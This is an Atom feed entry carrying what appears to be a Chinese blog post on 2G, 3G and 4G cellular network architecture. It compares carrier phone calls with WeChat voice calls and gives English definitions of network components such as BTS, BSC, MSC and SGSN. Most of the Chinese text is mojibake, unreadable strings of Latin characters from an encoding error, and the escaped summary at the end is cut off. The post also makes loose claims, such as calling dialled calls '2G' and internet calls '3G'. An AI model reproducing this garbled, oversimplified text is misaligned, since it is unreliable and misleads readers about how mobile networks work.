ï¼Œä¾¿æ‰“ç®—æŸ¥é˜…ä¹¦æœ¬å’Œæœé›†ç½‘ä¸Šèµ„æ–™ï¼Œæ»¡è¶³ä¸€ä¸‹è‡ªå·±çš„å¥½å¥‡å¿ƒï¼Œä¹Ÿå€Ÿæ­¤æœºä¼šé”»ç‚¼ä¸€ä¸‹å†™æ–‡ç« çš„èƒ½åŠ›ã€‚å¸Œæœ›é€šè¿‡é—®é¢˜çš„å¼•å…¥ï¼Œæˆ‘ä»¬èƒ½å¤Ÿç²—æµ…åœ°ä»æŠ€æœ¯å±‚é¢äº†è§£ 2G-3G-4G çš„é€šä¿¡ç½‘ç»œå‘å±•ã€‚</p><h2 id="è®¨è®ºèƒŒæ™¯å’Œé—®é¢˜æ¦‚è¿°"><a class="markdownIt-Anchor" href="#è®¨è®ºèƒŒæ™¯å’Œé—®é¢˜æ¦‚è¿°"></a> è®¨è®ºèƒŒæ™¯å’Œé—®é¢˜æ¦‚è¿°</h2><p>æ— è®ºæ˜¯ç”¨æ‰‹æœºç§»åŠ¨æ‹¨å·è¿˜æ˜¯é€šè¿‡å¾®ä¿¡è¯­éŸ³è§†é¢‘è¿›è¡Œé€šè®¯ï¼Œæ‰‹æœºä½œä¸ºï¼ˆç§»åŠ¨ï¼‰ä¸»æœºï¼ˆhostï¼‰ä½äºå› ç‰¹ç½‘è¾¹ç¼˜ï¼Œæ˜¯æ‰€è°“çš„** â€œè¾¹ç¼˜è®¾å¤‡â€ ** ã€‚è€Œè¿™ä¸ªè¾¹ç¼˜è®¾å¤‡ä¸æˆ‘ä»¬å¹³å¸¸çš„ä¸»æœºä¸åŒä¹‹å¤„åœ¨äºå®ƒæ˜¯æ— çº¿çš„ï¼ˆwirelessï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå’Œç½‘ç»œé€šä¿¡çš„ä¸‹ä¸€è·³ï¼ˆhopï¼‰ä¹‹é—´æ˜¯é€šè¿‡ç”µç£æ³¢è¿›è¡Œæ•°æ®äº¤æ¢çš„ã€‚åœ¨æ¥ä¸‹æ¥çš„æ¢è®¨ä¸­ï¼Œæˆ‘ä»¬å°†æ³¨æ„åŠ›ä¸»è¦æ”¾åœ¨æ— çº¿é“¾è·¯ä¸Šï¼Œä¹Ÿå³ OSI å‚è€ƒæ¨¡å‹ä¸­çš„é“¾è·¯å±‚ï¼ˆLink layerï¼‰ï¼Œè€Œä¸å»è®¨è®ºç½‘ç»œå±‚ç›¸å…³çš„å†…å®¹ï¼ˆä¹Ÿä¸ç›¸å…³ï¼‰å’Œç‰©ç†å±‚ç›¸å…³çš„çŸ¥è¯†ï¼ˆç‰©ç†å¾ˆå·®ï¼Œä¸æ‡‚ï¼‰ã€‚</p><p>å½“æˆ‘ä»¬åœ¨è®¨è®ºæ‰‹æœºæ‹¨å·å’Œå¾®ä¿¡ç”µè¯ä¹‹é—´çš„åŒºåˆ«æ—¶ï¼Œæˆ‘ä»¬åœ¨è®¨è®ºä»€ä¹ˆï¼Ÿ<strong>å®é™…ä¸Šï¼Œè¿™ä¸ªé—®é¢˜çš„å®è´¨æ˜¯ä¼ ç»Ÿçš„ç”µè¯é€šè¯å’Œé€šè¿‡äº’è”ç½‘è¿›è¡Œçš„è¯­éŸ³è§†é¢‘é€šè¯åœ¨æŠ€æœ¯å®ç°ä¸Šçš„åŒºåˆ«æ˜¯ä»€ä¹ˆã€‚</strong> å¦‚æœè¦ç”¨ä¸€å¥è¯ç²¾ç®€åœ°æ¦‚æ‹¬ï¼Œé‚£äºŒè€…çš„åŒºåˆ«å°±æ˜¯ä¸€ä¸ªæ˜¯åŸºäº 2G ä¼ è¾“çš„æ— çº¿ç”µæ³¢è¯­éŸ³ï¼Œä¸€ä¸ªæ˜¯åŸºäº 3G ä¼ è¾“çš„ IP è¯­éŸ³ã€‚</p><h2 id="2g-èœ‚çªç½‘ä½“ç³»"><a class="markdownIt-Anchor" href="#2g-èœ‚çªç½‘ä½“ç³»"></a> 2G èœ‚çªç½‘ä½“ç³»</h2><h4 id="2g-èœ‚çªç½‘ä½“ç³»ç»“æ„çš„ç»„ä»¶"><a class="markdownIt-Anchor" href="#2g-èœ‚çªç½‘ä½“ç³»ç»“æ„çš„ç»„ä»¶"></a> 2G èœ‚çªç½‘ä½“ç³»ç»“æ„çš„ç»„ä»¶</h4><p><img src="/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/2g.png" alt="2Gç½‘ç»œä½“ç³»ç»“æ„"></p><ul><li><strong>MS(Mobile Station)</strong>: MS is the user equipment such as cellphone, mobile computer or any other device which carriesÂ <a href="https://umutcanbolat.com/sim-card-basics"><strong>SIM card</strong></a>Â and have the software to communicate with the GSM network. In 3G systems, MS is referred to as UE (User Equipment).ï¼ˆå¾…æ¥å…¥çš„è¾¹ç¼˜è®¾å¤‡)</li><li><strong>BTS (Base Transreceiver Station)</strong>: BTS is the equipment used for transmitting and receiving radio signals between MS and a network. BTSâ€™s create cell structure. Mobile devices under the cell can communicate with the rest of the network. BTSâ€™s are connected to BSCâ€™s which controls them.ï¼ˆé€šä¿¡çš„æ”¶å‘åŸºç«™ï¼‰</li><li><strong>BSC (Base Station Controller)</strong>:BSC is the intelligence behind the BTSâ€™s. It can control multiple BTSâ€™s. BSC is responsible for allocation of radio frequencies, power and signal measurements. BSC also controls handover between one cell to another if they are under the control of same BSC.ï¼ˆåŸºç«™æ§åˆ¶å™¨ï¼Œç®¡ç†å„ä¸ªèœ‚çªä¸­çš„åŸºç«™ï¼‰</li><li><strong>MSC (Mobile Switching Center)</strong>: MSC is the core element of the Network Switching Subsystem (NSS). It is responsible for routing voice calls and SMS. MSC sets up end-to-endÂ <strong>circuit switched</strong>Â connection between subscribers. It handles mobile services such asÂ <strong>registration</strong>,Â <strong>authentication</strong>,Â <strong>location updating</strong>Â and InterÂ <strong>BSC-Intra MSC handovers</strong>.ï¼ˆç§»åŠ¨äº¤æ¢ä¸­å¿ƒï¼Œå¤„ç†å„ä¸ª BSC ä¼ é€’çš„æ•°æ®ï¼Œå®Œæˆæ³¨å†Œã€è®¤è¯ã€ä½ç½®æ›´æ–°ç­‰æœåŠ¡ï¼‰</li><li><strong>GMSC (Gateway MSC)</strong>:GMSC is a special kind of MSC that is used to route calls outside the mobile network. Whenever a call for a mobile subscriber comes from outside the mobile network (PSTN), or the subscriber wants to make a call to somebody outside the mobile network the call is routed through the GMSC.ï¼ˆç½‘å…³ï¼Œæ¥å…¥å…¬å…±ç”µè¯ç½‘çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼‰</li></ul><h4 id="æ‹¨å·è¯­éŸ³ä¼ è¾“è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#æ‹¨å·è¯­éŸ³ä¼ è¾“è¿‡ç¨‹"></a> æ‹¨å·è¯­éŸ³ä¼ è¾“è¿‡ç¨‹</h4><p>ä¼ ç»Ÿçš„èœ‚çªï¼ˆCellularï¼‰ç”µè¯é€šè¿‡ PSTNï¼ˆæˆ–èœ‚çªç½‘ç»œï¼‰ä¼ è¾“è¯­éŸ³ä¿¡å·ï¼Œè¯­éŸ³ä¿¡å·ä»æ¨¡æ‹Ÿä¿¡å·è½¬åŒ–ä¸ºæ•°å­—ä¿¡å·å¹¶è¿›è¡Œå‹ç¼©ï¼Œé€šè¿‡æ— çº¿ç”µæ³¢ä¼ è¾“åˆ°è¿è¥å•†çš„åŸºç«™ï¼Œå†é€šè¿‡æ ¸å¿ƒç½‘ç»œä¼ é€åˆ°å¯¹æ–¹çš„ç”µè¯ã€‚æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬é€šè¿‡æ‰‹æœºæ‹¨å·æ˜¯é€šè¿‡ 2G èœ‚çªç½‘å°†æˆ‘ä»¬çš„è¯­éŸ³ä¸ç”µè¯ç½‘ç›¸è¿æ¥ï¼Œå®ç°ä¸¤ä¸ªç”¨æˆ·è¯­éŸ³å³æ—¶é€šä¿¡ã€‚</p><h2 id="3g-èœ‚çªç½‘ä½“ç³»"><a class="markdownIt-Anchor" href="#3g-èœ‚çªç½‘ä½“ç³»"></a> 3G èœ‚çªç½‘ä½“ç³»</h2><h4 id="3g-ç³»ç»Ÿä½“ç³»ç»“æ„"><a class="markdownIt-Anchor" href="#3g-ç³»ç»Ÿä½“ç³»ç»“æ„"></a> 3G ç³»ç»Ÿä½“ç³»ç»“æ„</h4><p><img src="/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/3g.png" alt="3Gç½‘ç»œä½“ç³»ç»“æ„"></p><ul><li>SGSN(Serving Generalized packet radio service Support Node): æœåŠ¡é€šç”¨åˆ†ç»„æ— çº¿æœåŠ¡æ”¯æŒèŠ‚ç‚¹ï¼Œè´Ÿè´£ä¸ºç§»åŠ¨èŠ‚ç‚¹äº¤ä»˜ï¼ˆæˆ–æ¥å—ï¼‰æ•°æ®æŠ¥ï¼Œæä¾›ç”¨æˆ·è®¤è¯å’Œåˆ‡æ¢ï¼Œå¹¶ç»´æŠ¤ç§»åŠ¨èŠ‚ç‚¹çš„ä½ç½®ä¿¡æ¯</li><li>GGSN(Gateway GPRS Support Node): ç½‘å…³ GPRS æ”¯æŒèŠ‚ç‚¹ï¼Œä»å¤–éƒ¨æ¥çœ‹ï¼Œå®ƒæ˜¯ç§»åŠ¨èŠ‚ç‚¹æ•°æ®æŠ¥è¿›å…¥å› ç‰¹ç½‘çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œçœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ªç½‘ç»œè·¯ç”±å™¨</li></ul><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° 3G æ˜¯åœ¨ 2G çš„åŸºç¡€ç½‘ç»œä½“ç³»ä¸Šå¢åŠ äº†å› ç‰¹ç½‘ç›¸å…³çš„ç»„ä»¶ï¼Œå¹¶åˆ†ç¦»å‡ºæ— çº¿ç”µæ¥å…¥ç½‘ï¼ˆradio acess networkï¼‰å’Œæ ¸å¿ƒç½‘(core network)ä¸¤ä¸ªç½‘ç»œï¼Œåœ¨æ•°æ®ç½‘çš„åˆ†æ”¯ä¸Šï¼Œæœ€ç»ˆæ¥å…¥çš„èŠ‚ç‚¹æ˜¯å› ç‰¹ç½‘ã€‚</p><h4 id="å¾®ä¿¡ç”µè¯è¯­éŸ³ä¼ è¾“è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#å¾®ä¿¡ç”µè¯è¯­éŸ³ä¼ è¾“è¿‡ç¨‹"></a> å¾®ä¿¡ç”µè¯è¯­éŸ³ä¼ è¾“è¿‡ç¨‹</h4><p>äº’è”ç½‘è¯­éŸ³ï¼ˆIP è¯­éŸ³ï¼‰å’Œè§†é¢‘é€šè¯ä½¿ç”¨çš„æ˜¯ TCP/IP åè®®æ ˆã€‚è¯­éŸ³å’Œè§†é¢‘æ•°æ®è¢«æ•°å­—åŒ–åå°è£…æˆæ•°æ®åŒ…ï¼Œé€šè¿‡äº’è”ç½‘è¿›è¡Œä¼ è¾“ã€‚è¿™äº›æ•°æ®åŒ…å¯èƒ½ç»è¿‡å¤šä¸ªè·¯ç”±å™¨å’Œç½‘ç»œèŠ‚ç‚¹ï¼Œæœ€ç»ˆåˆ°è¾¾å¯¹æ–¹çš„è®¾å¤‡ã€‚æ‰€ä»¥è¯´ï¼Œæˆ‘ä»¬è¿›è¡Œå¾®ä¿¡ç”µè¯æ—¶é€šè¿‡ 3G ç½‘ç»œä¼ è¾“è¯­éŸ³æ•°æ®åŒ…ï¼Œåœ¨å› ç‰¹ç½‘ä¸­ä¸æ–­è½¬å‘ç›´åˆ°ä¸æˆ‘ä»¬é€šä¿¡çš„ç›®æ ‡ç»ˆç«¯ã€‚</p><h2 id="é—®é¢˜çš„ç­”æ¡ˆ"><a class="markdownIt-Anchor" href="#é—®é¢˜çš„ç­”æ¡ˆ"></a> é—®é¢˜çš„ç­”æ¡ˆ</h2><p>ç”±ä¸Šé¢å¯¹ 2G å’Œ 3G ç½‘ç»œä½“ç³»çš„ä»‹ç»å¯çŸ¥ï¼Œè¿™ä¸¤ç§é€šè¯æ‰€ä½¿ç”¨çš„æŠ€æœ¯æ˜¯æœ‰æå¤§çš„åŒºåˆ«çš„ã€‚ä¼ ç»Ÿç”µè¯ä¾èµ–äº<strong>ä¸“ç”¨çš„ç”µä¿¡ç½‘ç»œåŸºç¡€è®¾æ–½å’Œåè®®</strong>ï¼ˆå¦‚ GSMã€CDMAã€LTEï¼‰ï¼Œè€Œäº’è”ç½‘é€šè¯ä¾èµ–äº<strong>é€šç”¨çš„ IP ç½‘ç»œå’Œäº’è”ç½‘åè®®</strong>ã€‚å½“ç„¶äºŒè€…ä¹Ÿéå®Œå…¨ä¸åŒï¼Œæ— è®ºæ˜¯ä¼ ç»Ÿç”µè¯è¿˜æ˜¯äº’è”ç½‘é€šè¯ï¼Œæœ€ç»ˆéƒ½æ¶‰åŠåˆ°è¯­éŸ³æ•°æ®çš„æ•°å­—åŒ–å’Œä¼ è¾“ï¼Œåœ¨è¯­éŸ³ä¼ è¾“è¿‡ç¨‹ä¸­ä¹Ÿéƒ½ä¼šé€šè¿‡èœ‚çªç½‘ç»œã€‚</p><h2 id="4g-èœ‚çªç½‘ä½“ç³»"><a class="markdownIt-Anchor" href="#4g-èœ‚çªç½‘ä½“ç³»"></a> 4G èœ‚çªç½‘ä½“ç³»</h2><h4 id="4g-ç³»ç»Ÿä½“ç³»ç»“æ„"><a class="markdownIt-Anchor" href="#4g-ç³»ç»Ÿä½“ç³»ç»“æ„"></a> 4G ç³»ç»Ÿä½“ç³»ç»“æ„</h4><p><img src="/2024/08/08/%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%8F%91%E5%B1%95/4g.png" alt="4Gç½‘ç»œä½“ç³»ç»“æ„"><br>ç”± 3GPP æå‡ºçš„ 4G é•¿æœŸæ¼”è¿›ç½‘ç»œï¼ˆLTEï¼‰ï¼Œè¾ƒä¹‹ 3G ç³»ç»Ÿè€Œè¨€æœ‰ä¸¤ä¸ªåˆ›æ–°ï¼šä¸€ä¸ª<strong>å…¨ IP æ ¸å¿ƒç½‘</strong>å’Œä¸€ä¸ª<strong>åŠ å¼ºçš„æ— çº¿ç”µæ¥å…¥ç½‘</strong>ã€‚</p><ul><li>æ˜¯ä¸€ç§ç»Ÿä¸€çš„ï¼Œå…¨ IP çš„ç½‘ç»œä½“ç³»ç»“æ„ã€‚ä¸Šé¢ä»‹ç»çš„ 3G ç½‘ç»œå¯¹äºè¯­éŸ³å’Œæ•°æ®æµé‡å…·æœ‰åˆ†ç¦»çš„ç½‘ç»œç»„ä»¶å’Œè·¯å¾„ï¼Œè€Œ 4G ä½“ç³»ç»“æ„å°†è¯­éŸ³å’Œæ•°æ®éƒ½æ‰¿è½½åœ¨ IP æ•°æ®æŠ¥ä¸­ï¼ˆå…¨ IP çš„å«ä¹‰ï¼‰ï¼Œæ¥è‡ª/å‘å¾€ç”¨æˆ·è®¾å¤‡ï¼ˆUEï¼‰ï¼Œåˆ°åˆ†ç»„ç½‘å…³ï¼ˆP-GWï¼‰â€”â€”è¯¥ç½‘å…³å°† 4G è¾¹ç¼˜ç½‘ç»œè¿æ¥åˆ°ç½‘ç»œçš„å…¶ä»–éƒ¨åˆ†ã€‚</li><li>4G æ•°æ®å¹³é¢å’Œæ§åˆ¶å¹³é¢æ¸…æ™°åˆ†ç¦»ã€‚</li><li>æ— çº¿ç”µæ¥å…¥ç½‘å’Œå…¨ IP æ ¸å¿ƒç½‘ä¹‹é—´æ¸…æ™°åˆ†ç¦»ã€‚</li></ul><hr><p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p><p><strong>1. <em>Computer Networking: A Top-Down Approach</em></strong><br><strong>2. <a href="https://umutcanbolat.com/2g-gsm-cellular-network-basics/">GSM 2G Cellular Network</a></strong><br><strong>3. <a href="https://dz.linkedin.com/in/ilyes-amokrane-lezzoum?trk=article-ssr-frontend-pulse_publisher-author-card">Architecture of Mobile Networks (2G, 3G and 4G)</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;é—®é¢˜äº§ç”Ÿ&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#é—®é¢˜äº§ç”Ÿ&quot;&gt;&lt;/a&gt; é—®é¢˜äº§ç”Ÿ&lt;/h2&gt;
&lt;p&gt;åœ¨ä¸€æ¬¡å¸®å®¶é‡Œè€äººåŠç†è¿è¥å•†å¥—é¤æ—¶ï¼Œæˆ‘å»ºè®®é•¿è¾ˆè¦æ‰“ç”µè¯çš„è¯å°±å°½é‡ç”¨å¾®ä¿¡æ¥æ‰“ç”µè¯ï¼Œè€Œå°‘ç”¨æ‹¨å·çš„æ–¹å¼æ‹¨æ‰“ç§»åŠ¨ç”µè¯ã€‚å¯¹æ­¤æˆ‘å’Œé•¿è¾ˆçš„è§£é‡Šæ˜¯ï¼šå‰</summary>
      
    
    
    
    
  </entry>
  
</feed>
